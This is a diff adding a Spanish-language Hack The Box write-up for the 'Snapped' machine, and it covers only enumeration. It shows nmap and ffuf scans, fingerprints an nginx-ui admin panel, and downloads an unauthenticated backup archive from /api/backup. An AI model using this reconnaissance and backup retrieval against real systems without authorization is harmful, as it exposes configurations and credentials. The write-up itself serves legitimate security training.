@@ -1,0 +1,157 @@
+---
+title: Snapped
+featured: true
+lang: es
+image: ../../../../../images/writeups/hackthebox/snapped/snapped.png
+platform: htb
+difficulty: easy
+os: linux
+hints: []
+tags: [hackthebox, linux]
+parent: writeups/hackthebox/machines
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/snapped/snapped.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Snapped](https://app.hackthebox.com/machines/Snapped)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/Snapped 10.129.14.169
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openPorts 10.129.14.169
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
+|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://snapped.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Agregar `snapped.htb` al archivo `/etc/hosts`
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://snapped.htb -H 'Host: FUZZ.snapped.htb' -ic -c -t 100 -fs 154
+```
+
+```plaintext
+admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 164ms]
+```
+
+Agregar `admin.snapped.htb` al archivo `/etc/hosts`
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://admin.snapped.htb/FUZZ -ic -c -t 100
+```
+
+```plaintext
+mcp                     [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 162ms]
+```
+
+[http://admin.snapped.htb/#/login?next=/dashboard/server](http://admin.snapped.htb/#/login?next=/dashboard/server)
+
+<div style="display: flex; justify-content: center;">
+
+![Web admin subdomain](@images/writeups/hackthebox/snapped/snapped-web-admin.png)
+
+</div>
+
+```bash
+curl -s http://admin.snapped.htb | grep -P ".js\b"
+```
+
+```plaintext
+<script type="module" crossorigin src="./assets/index-DoHxQupa.js"></script>
+```
+
+```bash
+curl -s http://admin.snapped.htb/assets/index-DoHxQupa.js | grep -oP "version[-\w]*\.js"
+```
+
+```plaintext
+version-BWPlJ0ga.js
+version-CdjIlmL0.js
+```
+
+```bash
+curl -s http://admin.snapped.htb/assets/version-BWPlJ0ga.js
+```
+
+```plaintext
+const t="2.3.2";const o={version:t,build_id:1,total_build:512};export{o as a,t as v};
+```
+
+<div style="display: flex; justify-content: center;">
+
+![Web Burp](@images/writeups/hackthebox/snapped/snapped-web-burp.png)
+
+</div>
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://admin.snapped.htb/api/FUZZ -ic -c -t 100
+```
+
+```plaintext
+backup                  [Status: 200, Size: 18354, Words: 56, Lines: 77, Duration: 190ms]
+certs                   [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 159ms]
+config                  [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 156ms]
+configs                 [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 157ms]
+events                  [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 161ms]
+install                 [Status: 200, Size: 29, Words: 1, Lines: 1, Duration: 155ms]
+licenses                [Status: 200, Size: 52782, Words: 9, Lines: 1, Duration: 186ms]
+node                    [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 158ms]
+notifications           [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 155ms]
+settings                [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 154ms]
+sites                   [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 158ms]
+user                    [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 154ms]
+users                   [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 154ms]
+```
+
+```bash
+curl http://admin.snapped.htb/api/backup --output backup
+```
+
+```bash
+file backup
+```
+
+```plaintext
+backup: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jun 02 2026 19:31:56, uncompressed size 208, method=deflate
+```
+
+```bash
+mkdir output
+unzip backup -d output/
+cd output/
+tree
+```
+
+```plaintext
+.
+├── hash_info.txt
+├── nginx-ui.zip
+└── nginx.zip
+```
